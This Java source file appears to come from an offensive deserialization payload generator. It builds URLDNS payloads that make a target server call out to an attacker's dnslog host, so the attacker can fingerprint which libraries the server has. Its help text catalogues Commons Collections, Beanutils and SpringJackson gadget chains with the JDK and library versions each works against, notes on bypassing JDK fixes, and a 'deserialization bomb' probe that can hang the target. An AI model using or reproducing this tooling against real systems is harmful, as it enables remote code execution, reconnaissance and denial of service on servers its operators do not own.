package com.xyuxu.javasec.utils;

import javassist.ClassPool;
import javassist.CtClass;

import java.net.URL;
import java.net.URLStreamHandler;
import java.util.HashMap;
import java.util.LinkedHashMap;
import java.util.Map;

public class ProbeUtil {


    public static HashMap<Object, Object> makeDNSProbeMap(String dnsUrl, String className) {
        try {
            Class<?> clazz = null;
            // 尝试加载 JDK 内置类或已存在的类
            if (className.startsWith("java.") || className.startsWith("javax.")
                    || className.startsWith("sun.") || className.startsWith("jdk.")) {
                try {
                    clazz = Class.forName(className);
                } catch (ClassNotFoundException ignored) {}
            }

            // 如果 clazz 仍为 null (即不是内置类或内置类找不到)，则动态伪造一个
            if (clazz == null) {
                try {
                    // 使用独立的 ClassPool 防止污染主环境
                    ClassPool pool = new ClassPool(true);
                    CtClass ctClass = pool.makeClass(className);
                    // 使用匿名 ClassLoader 加载，确保该类仅用于此次 Payload 构造，不影响当前进程
                    clazz = ctClass.toClass(new ClassLoader() {}, null);
                } catch (Exception ignored) {
                    // 如果伪造也失败，clazz 保持为 null
                }
            }

            // 构造 URLDNS 探测链逻辑
            // SilentURLStreamHandler 需要你项目中已存在 (通常用于避免生成 payload 时触发 DNS)
            URLStreamHandler handler = new SilentURLStreamHandler();
            URL url = new URL(null, dnsUrl, handler);

            HashMap<Object, Object> hashMap = new HashMap<>();
            // 将 URL 作为 key，将探测类作为 value
            hashMap.put(url, clazz);

            // 重置 hashCode 为 -1，确保目标服务器收到后一定会重新计算并触发 DNS
            Reflections.setFieldValue(url, "hashCode", -1);
            return hashMap;
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }

    public static Class<?> makeProbeClass(String className) throws Exception {
        ClassPool classPool = ClassPool.getDefault();
        CtClass ctClass = classPool.makeClass(className);
        Class<?> clazz = ctClass.toClass();
        ctClass.defrost();
        return clazz;
    }


    public static final Map<String, String> PROBE_MAP = new LinkedHashMap<>();

    static {
        // --- Commons Component ---
        PROBE_MAP.put("CC31", "org.apache.commons.collections.functors.ChainedTransformer"); // CC 3.1-3.2.1
        PROBE_MAP.put("CC40", "org.apache.commons.collections4.functors.ChainedTransformer"); // CC 4.0
        PROBE_MAP.put("CB18", "org.apache.commons.beanutils.MappedPropertyDescriptor");      // CB 1.8.x
        PROBE_MAP.put("CB19", "org.apache.commons.beanutils.BeanIntrospectionData");          // CB 1.9.x

        // --- Database / Connection Pool ---
        PROBE_MAP.put("C3P0_92", "com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase");
        PROBE_MAP.put("C3P0_95", "com.mchange.v2.c3p0.test.AlwaysFailDataSource");
        PROBE_MAP.put("Druid", "com.alibaba.druid.pool.DruidDataSource");
        PROBE_MAP.put("HikariCP", "com.zaxxer.hikari.HikariDataSource");

        // --- RCE Gadget Libs ---
        PROBE_MAP.put("Groovy", "org.codehaus.groovy.runtime.MethodClosure");
        PROBE_MAP.put("AspectJ", "org.aspectj.weaver.tools.cache.SimpleCache");
        PROBE_MAP.put("BeanShell", "bsh.Interpreter");
        PROBE_MAP.put("Rome", "com.sun.syndication.feed.impl.ObjectBean");

        // --- JSON / XML ---
        PROBE_MAP.put("Fastjson", "com.alibaba.fastjson.JSON");
        PROBE_MAP.put("Jackson", "com.fasterxml.jackson.databind.ObjectMapper");
        PROBE_MAP.put("SnakeYAML", "org.yaml.snakeyaml.Yaml");
        PROBE_MAP.put("XStream", "com.thoughtworks.xstream.XStream");
        PROBE_MAP.put("Hessian", "com.caucho.hessian.io.HessianInput");

        // --- Middleware ---
        PROBE_MAP.put("Tomcat", "org.apache.catalina.core.StandardContext");
        PROBE_MAP.put("WebLogic", "weblogic.work.WorkAdapter");
        PROBE_MAP.put("Resin", "com.caucho.server.resin.Resin");
        PROBE_MAP.put("Jetty", "org.eclipse.jetty.server.Server");
        PROBE_MAP.put("WebSphere", "com.ibm.ws.spi.servlets.ServletContainer");

        // --- Spring ---
        PROBE_MAP.put("SpringCore", "org.springframework.core.SpringVersion");
        PROBE_MAP.put("SpringAOP", "org.springframework.aop.framework.JdkDynamicAopProxy");
        PROBE_MAP.put("SpringWeb", "org.springframework.web.servlet.DispatcherServlet");

        // --- JNDI / Tomcat Vulnerability ---
        PROBE_MAP.put("BeanFactory", "org.apache.naming.factory.BeanFactory");
        PROBE_MAP.put("ELProcessor", "javax.el.ELProcessor");
    }

    /**
     * 避免了维护两份数据的麻烦，只要 PROBE_MAP 更新，帮助信息自动更新
     */
    private static String buildProbeHelp() {
        StringBuilder sb = new StringBuilder();
        sb.append("\n=== 常用探测类名列表 ===\n");
        sb.append(String.format("%-15s | %s\n", "Code", "Class Name"));
        sb.append("------------------------------------------------------------\n");

        for (Map.Entry<String, String> entry : PROBE_MAP.entrySet()) {
            sb.append(String.format("%-15s | %s\n", entry.getKey(), entry.getValue()));
        }
        sb.append("------------------------------------------------------------\n");
        return sb.toString();
    }


    /**
     * 根据 Gadget 名称获取对应的帮助信息
     */
    public static String getHelpText(String gadgetSimpleName) {

        String commonProbeInfo = buildProbeHelp();
        switch (gadgetSimpleName) {
            // --- 探测类 Gadget ---
            case "FindClassByDNS":
                return "=== FindClassByDNS ===\n" +
                        "格式: dnslog_url|ClassName\n" +
                        "示例: xxx.dnslog.cn|org.springframework.core.SpringVersion\n" +
                        "说明: 利用 HashMap put 时的 ClassNotFoundException 阻断机制探测类是否存在。\n" +
                        "--------------------------------------------------\n" +
                        commonProbeInfo;

            case "FindClassByBomb":
                return "=== FindClassByBomb ===\n" +
                        "格式: ClassName (默认深度24) 或 ClassName|Depth\n" +
                        "说明: 利用反序列化炸弹原理探测类。如果类存在，反序列化时间极长；不存在则报错退出。\n" +
                        "注意: 深度建议 23-25，过大可能导致目标服务器卡死。\n" +
                        "--------------------------------------------------\n" +
                        commonProbeInfo;

            case "FindClassByDNSAll":
                return "=== FindClassByDNSAll ===\n" +
                        "格式: dnslog_url\n" +
                        "示例: xxx.dnslog.cn\n" +
                        "说明: 自动遍历内置的 PROBE_MAP，一键批量探测上述所有常见类。\n" +
                        "--------------------------------------------------\n" +
                        commonProbeInfo;

            case "URLDNS":
                return "=== URLDNS ===\n" +
                        "格式: dnslog_url\n" +
                        "示例: xxx.dnslog.cn\n" +
                        "说明: 反序列化入口检测神器。利用 HashMap key.hashCode() 触发 DNS 请求。\n";

            default:
                return getExploitGadgetHelp(gadgetSimpleName);
        }
    }


    /**
     * 具体的利用链详情帮助信息
     */
    private static String getExploitGadgetHelp(String name) {
        switch (name) {
            // ================== Commons Collections ==================
            case "CommonsCollections1":
                return "=== CommonsCollections1 (CC1) ===\n" +
                        "适用环境: JDK < 8u71\n" +
                        "依赖版本: commons-collections:3.1 - 3.2.1\n" +
                        "触发链: \n" +
                        "  AnnotationInvocationHandler.readObject()\n" +
                        "   -> Map(Proxy).entrySet()\n" +
                        "     -> AnnotationInvocationHandler.invoke()\n" +
                        "       -> LazyMap.get()\n" +
                        "         -> ChainedTransformer.transform()\n" +
                        "           -> InvokerTransformer.transform()\n" +
                        "说明: 利用动态代理拦截 Map 操作。JDK 8u71 后改写了 AnnotationInvocationHandler，导致无法触发代理。\n";

            case "CommonsCollections2":
                return "=== CommonsCollections2 (CC2) ===\n" +
                        "适用环境: JDK < 17 \n" +
                        "依赖版本: commons-collections4:4.0\n" +
                        "触发链: \n" +
                        "  PriorityQueue.readObject()\n" +
                        "   -> TransformingComparator.compare()\n" +
                        "     -> InvokerTransformer.transform()\n" +
                        "       -> TemplatesImpl.newTransformer()\n" +
                        "说明: 利用 PriorityQueue 排序触发 Comparator，结合 TemplatesImpl 加载字节码执行命令，不依赖 Transformer 数组。\n";

            case "CommonsCollections3":
                return "=== CommonsCollections3 (CC3 - TiedMapEntry变种) ===\n" +
                        "适用环境: JDK < 17 (推荐 JDK 8 全版本)\n" +
                        "依赖版本: commons-collections:3.1 - 3.2.1\n" +
                        "触发链: \n" +
                        "  HashMap.readObject()\n" +
                        "   -> HashMap.hash()\n" +
                        "     -> TiedMapEntry.hashCode()\n" +
                        "       -> LazyMap.get()\n" +
                        "         -> ChainedTransformer.transform()\n" +
                        "           -> TrAXFilter.newTransformer()\n" +
                        "             -> TemplatesImpl.newTransformer()\n" +
                        "说明: 这是一个混合利用链。使用了 CC6 的入口 (TiedMapEntry) 以绕过 JDK 8u71+ 对 AnnotationInvocationHandler 的限制，" +
                        "同时保留了 CC3 的 TrAXFilter 核心以绕过对 InvokerTransformer 的直接检测。\n";

            case "CommonsCollections4":
                return "=== CommonsCollections4 (CC4) ===\n" +
                        "适用环境: JDK < 17 \n" +
                        "依赖版本: commons-collections4:4.0\n" +
                        "触发链: \n" +
                        "  PriorityQueue.readObject()\n" +
                        "   -> TransformingComparator.compare()\n" +
                        "     -> ChainedTransformer.transform()\n" +
                        "       -> TrAXFilter.newTransformer()\n" +
                        "         -> InstantiateTransformer\n" +
                        "           -> TemplatesImpl.newTransformer()\n" +
                        "说明: CC2 的升级版，结合 TrAXFilter 绕过技巧。\n";

            case "CommonsCollections5":
                return "=== CommonsCollections5 (CC5) ===\n" +
                        "适用环境: JDK 8 全版本 (需无 SecurityManager)\n" +
                        "依赖版本: commons-collections:3.1 - 3.2.1\n" +
                        "触发链: \n" +
                        "  BadAttributeValueExpException.readObject()\n" +
                        "   -> TiedMapEntry.toString()\n" +
                        "     -> LazyMap.get()\n" +
                        "       -> ChainedTransformer.transform()\n" +
                        "说明: 利用 BadAttributeValueExpException 触发 toString()。" +
                        "注意：JDK 8u76+ 增加了 SecurityManager 检查，但现代 Web 容器通常不开启 SM，因此该链依然通用。\n";

            case "CommonsCollections6":
                return "=== CommonsCollections6 (CC6) ===\n" +
                        "适用环境: JDK (无限制)\n" +
                        "依赖版本: commons-collections:3.1 - 3.2.1\n" +
                        "触发链: \n" +
                        "  HashSet.readObject()\n" +
                        "   -> HashMap.put()\n" +
                        "     -> HashMap.hash()\n" +
                        "       -> TiedMapEntry.hashCode()\n" +
                        "         -> LazyMap.get()\n" +
                        "           -> ChainedTransformer.transform()\n" +
                        "说明: 目前最通用的 CC 3.x 利用链。利用 HashSet 反序列化触发 hashCode。\n";

            case "CommonsCollections7":
                return "=== CommonsCollections7 (CC7) ===\n" +
                        "适用环境: JDK (无限制)\n" +
                        "依赖版本: commons-collections:3.1 - 3.2.1\n" +
                        "触发链: \n" +
                        "  ObjectInputStream.readObject()\n" +
                        "   -> HashMap.readObject()\n" +
                        "     -> HashMap.putVal()\n" +
                        "       -> hash 冲突（桶非空）\n" +
                        "         -> key.equals()\n" +
                        "           -> AbstractMap.equals()\n" +
                        "             -> Map.get(key)\n" +
                        "               -> LazyMap.get()\n" +
                        "                 -> ChainedTransformer.transform()\n" +
                        "说明: CC7 利用 HashMap 在反序列化过程中处理 hash 冲突时调用 equals 的特性，\n";


            // ================== Commons Beanutils 系列 ==================

            case "CommonsBeanutils_192":
                return "=== CommonsBeanutils (CB 1.9.2) ===\n" +
                        "适用环境: JDK 17以下\n" +
                        "依赖版本: commons-beanutils:1.9.2\n" +
                        "关键类: org.apache.commons.beanutils.BeanComparator\n" +
                        "serialVersionUID: -3490850999041592962L\n" +
                        "触发链:\n" +
                        "   -> PriorityQueue.readObject()\n" +
                        "     -> PriorityQueue.heapify()\n" +
                        "       -> BeanComparator.compare()\n" +
                        "         -> PropertyUtils.getProperty()\n"+
                        "            → TemplatesImpl.getOutputProperties()\n" +
                        "              → TemplatesImpl.newTransformer()\n";

            case "CommonsBeanutils_183":
                return "=== CommonsBeanutils (1.8.3) ===\n" +
                        "适用环境: JDK 17以下\n" +
                        "依赖版本: commons-beanutils:1.8.x\n" +
                        "关键类: org.apache.commons.beanutils.BeanComparator\n" +
                        "serialVersionUID: 2573799559215537819L\n" +
                        "触发链:\n" +
                        "   -> PriorityQueue.readObject()\n" +
                        "     -> PriorityQueue.heapify()\n" +
                        "       -> BeanComparator.compare()\n" +
                        "         -> PropertyUtils.getProperty()\n"+
                        "            → TemplatesImpl.getOutputProperties()\n" +
                        "              → TemplatesImpl.newTransformer()\n" ;


            case "SpringJacksonEventListener":
                return "=== SpringJackson (EventListenerList) ===\n" +
                        "适用环境:\n" +
                        " - JDK 17+ \n" +
                        " - Spring Boot 3.x / Spring Framework 6.x\n" +
                        " - Spring-AOP <= 6.0.10\n" +
                        "\n" +
                        "触发链:\n" +
                        "  EventListenerList.readObject()\n" +
                        "   -> add() (检测到类型不匹配)\n" +
                        "    -> IllegalArgumentException\n" +
                        "     -> 隐式调用 toString()\n" +
                        "      -> UndoManager.toString()\n" +
                        "       -> Vector.toString()\n" +
                        "        -> POJONode.toString() (触发 Jackson 序列化)\n" +
                        "         -> JdkDynamicAopProxy.invoke() (AOP 代理拦截)\n" +
                        "          -> TemplatesImpl.getOutputProperties()\n" +
                        "           -> TemplatesImpl.newTransformer()\n" +
                        "\n" +
                        "说明: 利用 EventListenerList 异常回显触发 toString。\n";


            case "SpringJacksonEventListener2":
                return  "=== SpringJacksonShiro ===\n" +
                        " - JDK 17+ \n" +
                        " - Spring Boot 3.x / Spring Framework 6.x\n" +
                        " - Spring-AOP >= 6.0.10\n" +
                        "\n" +
                        "触发链:\n" +
                        "  EventListenerList.readObject()\n" +
                        "   -> add() (检测到类型不匹配)\n" +
                        "    -> IllegalArgumentException\n" +
                        "     -> 隐式调用 toString()\n" +
                        "      -> UndoManager.toString()\n" +
                        "       -> Vector.toString()\n" +
                        "        -> POJONode.toString() (触发 Jackson 序列化)\n" +
                        "         -> JdkDynamicAopProxy.invoke() (AOP 代理拦截)\n" +
                        "          -> TemplatesImpl.getOutputProperties()\n" +
                        "           -> TemplatesImpl.newTransformer()\n" +
                        "\n" +
                        "说明: 利用 EventListenerList 异常回显触发 toString。\n";

            case "SpringJacksonHashMap":
                return "=== SpringJackson2 (HashMap + XString) ===\n" +
                        "适用环境:\n" +
                        " - JDK 8 ~ JDK 17+ (全版本通杀，推荐)\n" +
                        " - Spring Boot 3.x / Spring Framework 6.x\n" +
                        " - Spring-AOP <= 6.0.10\n" +
                        "\n" +
                        "触发链:\n" +
                        "  HashMap.readObject()\n" +
                        "   -> putVal()\n" +
                        "    -> key.equals() \n" +
                        "     -> XString.equals(POJONode)\n" +
                        "      -> POJONode.toString() (XString 特性: 强制转String)\n" +
                        "       -> POJONode.toString() (触发 Jackson)\n" +
                        "        -> JdkDynamicAopProxy.invoke()\n" +
                        "         -> TemplatesImpl.getOutputProperties()\n" +
                        "          -> TemplatesImpl.newTransformer()\n" +
                        "\n" +
                        "说明: 利用 HashMap 哈希碰撞和 XString.equals 特性\n";

            case "SpringJacksonHashMap2":
                return "=== SpringJackson3 ===\n" +
                        "适用环境:\n" +
                        " - JDK 8 ~ JDK 17+\n" +
                        " - Spring Boot 2.x / 3.x\n" +
                        " - Spring-AOP >= 6.0.9 \n" +
                        "\n" +
                        "触发链:\n" +
                        "  HashMap.readObject()\n" +
                        "   -> putVal()\n" +
                        "    -> key.equals() \n" +
                        "     -> HotSwappableTargetSource.equals(XString)\n" +
                        "      -> XString.equals(POJONode)\n" +
                        "       -> ... (同 SpringJackson2)\n";


            default:
                return null;
        }
    }
}